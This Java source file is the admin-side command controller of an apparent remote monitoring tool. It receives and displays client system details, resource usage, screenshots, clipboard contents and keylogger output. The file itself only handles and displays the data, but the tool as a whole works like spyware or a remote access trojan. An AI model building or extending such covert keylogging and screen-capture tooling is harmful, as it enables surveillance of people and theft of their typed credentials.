package controllers;

import admin.Admin;
import controllers.base.ConsumeExecutable;
import models.SystemInfoModel;
import org.json.JSONArray;
import org.json.JSONObject;
import utils.JSON;
import utils.console;

import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.util.HashMap;
import java.util.Map;
import java.util.Vector;

import static utils.Command.*;
import static utils.Command.COMMAND_CLIENT_SCREEN;

public class ConsumeController {

    private static Map<String, ConsumeExecutable<JSON>> controller = new HashMap();

    public static void init() {
        put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
        put(COMMAND_MONITORING, ConsumeController::getMonitoring);
        put(COMMAND_CLIPBOARD, ConsumeController::getClipboard);
        put(COMMAND_KEYLOGGER, ConsumeController::getKeylogger);
        put(COMMAND_SYNC, ConsumeController::synchronize);
        put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
    }

    private static void getScreen(JSON input, Admin admin) {
        try {
            JSONArray imageBuffer = new JSONArray(input.get("image"));
            int length = input.getInt("length");
            byte[] arr = new byte[length];

            for (int i = 0; i < length; i++) {
                arr[i] = Byte.parseByte(imageBuffer.get(i).toString());
            }

            ByteArrayInputStream temp = new ByteArrayInputStream(ByteBuffer.wrap(arr).array());
            BufferedImage image2 = ImageIO.read(ImageIO.createImageInputStream(temp));
            ImageIcon temp1 = new ImageIcon(image2);
            Admin.getGui().updateClientScreen(temp1);
            console.log("alo");
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }

    private static void synchronize(JSON input, Admin admin) {
        Admin.getGui().sync();
        admin.setClients(new HashMap());
        ConsumeController.getAllClients(input, admin);
    }

    private static void getKeylogger(JSON input, Admin admin) {
        JSONArray logs = new JSONArray(input.get("keylogger").toString());
        logs.forEach(log -> {
            Admin.getGui().appendLog("[Keylog] " + log.toString());
        });
    }

    private static void getClipboard(JSON input, Admin admin) {
        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard").toString());
    }

    private static void getAllClients(JSON input, Admin admin) {
        HashMap clients = admin.getClients();
        JSONArray arr = new JSONArray(input.get("clients").toString());
        arr.forEach(e -> {
            JSON json = new JSON(e.toString());
            Vector<String> si = new Vector<>();
            si.add(json.get("UUID"));
            si.add(json.get("os"));
            si.add(json.get("ip"));
            si.add(json.get("ram"));
            si.add(json.get("cpu"));
            si.add(json.get("disk"));
            si.add(json.get("hostName"));
            si.add(json.get("MAC_address"));
            clients.putIfAbsent(si.get(0), new SystemInfoModel(si.toArray()));
        });
    }

    private static void getMonitoring(JSON input, Admin admin) {
        Admin.getGui().updateProgressBar(
                input.getInt("cpu"),
                input.getInt("ram"),
                input.getInt("disk")
        );
    }

    public static ConsumeExecutable get(String key) {
        return controller.getOrDefault(key, ConsumeController::getNotFoundController);
    }

    private static void getNotFoundController(JSON jsonObject, Admin admin) throws Exception {
        throw new Exception("Invalid Command");
    }

    public static ConsumeExecutable put(String key, ConsumeExecutable<JSON> value) {
        return controller.put(key, value);
    }
}
